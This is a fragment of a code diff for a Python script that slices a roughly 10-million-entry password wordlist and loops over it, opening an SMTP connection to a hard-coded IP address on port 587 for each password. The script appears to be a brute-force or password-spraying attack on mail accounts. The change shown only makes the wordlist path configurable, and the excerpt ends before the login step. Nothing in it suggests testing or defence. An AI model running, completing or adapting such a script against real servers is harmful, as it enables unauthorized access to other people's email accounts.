@@ -1,6 +1,6 @@
 import smtplib,sys,time
 start=int(sys.argv[1]); count=int(sys.argv[2])
-pw=[l.rstrip('\n') for l in open('pw10m.txt')][start:start+count]
+pw=[l.rstrip('\n') for l in open(sys.argv[3] if len(sys.argv)>3 else 'pw10m.txt')][start:start+count]
 for p in pw:
     try:
         s=smtplib.SMTP('141.8.192.100',587,timeout=7); s.ehlo('x.local')
